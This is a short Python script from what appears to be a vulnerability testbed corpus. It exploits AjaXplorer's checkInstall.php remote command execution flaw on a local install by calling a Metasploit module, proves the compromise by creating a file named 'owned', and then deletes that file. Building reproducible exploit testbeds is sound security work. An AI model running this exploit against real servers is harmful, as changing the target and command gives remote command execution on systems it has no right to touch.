import sys
import os
import time
import urllib
import urllib2
import cookielib

import selenium.common.exceptions
import corpus

# POC: http://www.exploit-db.com/exploits/18791/

class Exploit (corpus.Exploit):

    def __init__(self):
        corpus.Exploit.__init__(self, {
                'Name' :        "OSVDB_63552",
                'Description' : "AjaXplorer checkInstall.php Remote Command Execution "
                                "Versions 2.5.5 or older are vulnerable.",
                'References' :  [['OSVDB', '63552']],
                'Target' :      "AjaXplorer 2.5.1",
                'VulWikiPage' : ""
                })
                                
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "metasploit-framework/msfcli multi/http/ajaxplorer_checkinstall_exec RHOST=127.0.0.1 TARGETURI=/ajaxplorer/ PAYLOAD=cmd/unix/generic CMD=\'touch /var/www/ajaxplorer/files/owned\' E"
        print "Running Metasploit"
        os.system(metasploit_cmd)

        print "Done! You can safely ignore the last warning from Metasploit, the server is vulnerable."
        print "There should now be a file called \"owned\" under /files when you visit http://localhost/ajaxplorer/#0"
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        print "Removing /var/www/ajaxplorer/owned"
        os.system("rm " + system_dir + "/var/www/ajaxplorer/files/owned")
        return

if __name__ == "__main__":
    engine = corpus.Engine(Exploit())
    engine.parse_args(sys.argv)
